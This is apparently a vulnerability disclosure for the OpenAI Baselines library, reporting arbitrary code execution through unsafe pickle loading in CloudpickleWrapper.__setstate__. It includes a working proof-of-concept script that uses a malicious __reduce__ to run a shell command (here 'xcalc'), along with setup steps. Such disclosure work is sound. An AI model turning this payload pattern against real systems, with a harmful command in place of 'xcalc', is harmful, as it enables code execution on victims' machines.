# Description
OpenAI Baselines: high-quality implementations of reinforcement learning algorithms 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
from baselines.common.vec_env import vec_env
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
vec_env.CloudpickleWrapper.__setstate__(dumps,dumps)
```
* `git clone https://github.com/openai/baselines.git`
* `cd baselines`
* `pip install tensorflow==1.14`
* `pip install -e .`
* `python3 exploit.py`
